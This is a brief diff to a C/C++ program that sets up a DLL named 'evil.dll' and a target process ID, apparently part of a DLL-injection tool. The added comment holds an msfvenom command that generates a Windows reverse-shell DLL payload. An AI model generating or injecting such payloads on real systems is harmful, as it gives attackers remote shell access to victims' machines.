@@ -5,6 +5,8 @@
 
 int main()
 {
+    //msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll
+    
     LPCSTR dllLibName = "evil.dll";
     DWORD processId = 0;
 
